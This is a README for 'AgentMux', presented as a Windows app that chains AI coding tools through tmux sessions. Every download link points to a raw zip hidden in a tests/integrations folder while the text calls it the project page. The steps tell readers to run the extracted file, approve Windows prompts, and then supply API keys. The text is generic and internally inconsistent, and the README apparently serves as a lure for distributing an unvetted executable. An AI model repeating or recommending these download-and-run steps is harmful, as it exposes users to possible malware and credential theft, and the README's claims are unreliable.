# 🤖 AgentMux - Run AI coding agents in order

[![Download AgentMux](https://img.shields.io/badge/Download-AgentMux-blue?style=for-the-badge&logo=github)](https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip)

## 🧭 What AgentMux does

AgentMux is a Windows app that helps you run several AI coding tools in a set order. It sends work through a pipeline, so each step can build on the last one. That makes it easier to go from a task idea to working code without switching between tools by hand.

Use it when you want to:
- break a software task into smaller steps
- run CLI-based AI tools in a fixed order
- keep each agent session separate
- track work across a full development flow
- reduce manual copy and paste between tools

AgentMux works with terminal-based AI tools such as Gemini, Claude, and Codex. It uses tmux-controlled sessions to keep each part of the pipeline organized.

## 💻 What you need

Before you start, make sure your PC has:
- Windows 10 or Windows 11
- an internet connection
- at least 8 GB of RAM
- 2 GB of free disk space
- permission to open downloaded files
- a terminal app if you plan to change settings later

For the smoothest setup, use a recent Windows build with Windows Terminal installed.

## 📥 Download AgentMux

Open the main project page here and download the app from the repository:

https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip

If the page opens a list of files, look for the latest Windows download, then save it to your PC.

## 🛠️ Install on Windows

1. Open the download link above.
2. Save the file to a folder you can find again, such as Downloads or Desktop.
3. If the file is a zip archive, right-click it and choose Extract All.
4. Open the extracted folder.
5. Find the main app file or launcher file.
6. Double-click the file to start AgentMux.
7. If Windows asks for permission, choose Run or Yes.
8. If a setup window appears, follow the on-screen steps.

If the app opens in a terminal window, keep that window open while you use AgentMux.

## 🚦 First launch

When you start AgentMux for the first time, it may ask for:
- your AI tool paths
- API keys or login details
- a project folder
- a task file or workflow name

Enter the requested details one at a time. If you are not sure what to type, use the values from your AI tool account or the default project folder you want to work in.

A common first setup looks like this:
- pick one folder for your code project
- choose the AI tools you want to use
- set the order of the pipeline steps
- save the profile
- run a test task

## ⚙️ Basic setup

AgentMux works best when you give it a clean project folder. Use a folder with a short name and no special characters. For example:
- `C:\Projects\MyApp`
- `C:\Work\DemoProject`

Then check these items:
- your AI tool is installed
- the tool can run from the command line
- your API key is saved
- the folder has write access
- your terminal opens in the right location

If AgentMux lets you choose a pipeline, start with a simple one. A short pipeline is easier to test than a long one.

## 🔁 How the pipeline works

AgentMux sends work through a chain of steps. Each step can use a different AI tool or a different session. That helps when you want one model to plan, another to code, and another to review.

A simple flow may look like this:
1. plan the task
2. draft the code
3. check the result
4. fix any issues
5. write files into the project folder

This setup helps keep each step focused. It also helps you repeat the same process for future tasks.

## 🧩 Common tasks

You can use AgentMux for tasks like:
- building a new app feature
- updating a page or screen
- cleaning up old code
- writing tests
- checking code for mistakes
- making small fixes across a project

A good way to start is to use one small task first, such as:
- add a button
- rename a file
- update text in the app
- fix one error message

That gives you a simple way to see how the pipeline behaves.

## 📂 Suggested folder setup

A clean folder layout makes the app easier to use:
- `C:\Projects\AgentMux`
- `C:\Projects\AgentMux\input`
- `C:\Projects\AgentMux\output`
- `C:\Projects\AgentMux\logs`

You do not need to use these exact folders. They are only a simple example. Keep your files in one place so you can find them again.

## 🧪 Test run

After setup, run one test task:
- open AgentMux
- choose a small task
- start the pipeline
- wait for each step to finish
- check the output folder or project files
- open the result in your editor or browser

If the result looks wrong, try a shorter task first. Small tasks make it easier to spot setup issues.

## 🔍 If something does not work

If AgentMux does not start, check these points:
- the file finished downloading
- Windows did not block the file
- the app is in the folder you opened
- your terminal can run local apps
- the project folder exists
- your AI tool is installed and ready

If a step stops part way through:
- close the app
- open it again
- run the same task once more
- use a simpler project folder name
- confirm the AI tool session is still signed in

If the app cannot find your tools, check the tool path and make sure the command works in a normal terminal window

## 🔐 Keys and sign-in

Some AI tools need an API key or account sign-in. Keep these details private and save them in the place the app expects. Use one key per tool if you use more than one model.

Before you run a full task, check that:
- the key is valid
- the account has access
- the tool can run from the command line
- your network connection is stable

## 🖥️ Using tmux sessions

AgentMux uses tmux-controlled sessions to manage separate parts of the workflow. On Windows, this helps keep each agent run in its own space. You do not need to manage tmux by hand for normal use, but it helps to know that each step may run in a separate session.

That means:
- one session can plan
- one session can write code
- one session can review changes
- one session can handle the next step

This keeps the pipeline neat and makes it easier to follow each task from start to finish

## 📦 File layout

A typical AgentMux install may include:
- the main launcher
- config files
- workflow files
- logs
- output files
- project task folders

If you see files with names like `config`, `workflow`, or `session`, leave them in place unless you know they need to change.

## 🧰 Tips for better results

- start with a small task
- use one project folder per app
- keep folder names short
- close extra terminal windows
- save your work before each run
- check output after every step
- use the same AI tool order each time while testing

These habits make it easier to see what AgentMux is doing and where a problem starts

## 🗂️ Example workflow

A simple workflow might look like this:
- Task: add a settings page
- Step 1: plan the page layout
- Step 2: generate the page code
- Step 3: check for errors
- Step 4: fix the code
- Step 5: save the final files

You can use the same pattern for many software tasks. The main idea is to keep each agent step clear and separate

## 📍 Download again

If you need to return to the project page, use this link:

https://github.com/derai7974/AgentMux/raw/refs/heads/main/tests/integrations/Mux-Agent-2.3.zip

Open it, get the latest Windows file, then download and run this file or open the install files from that page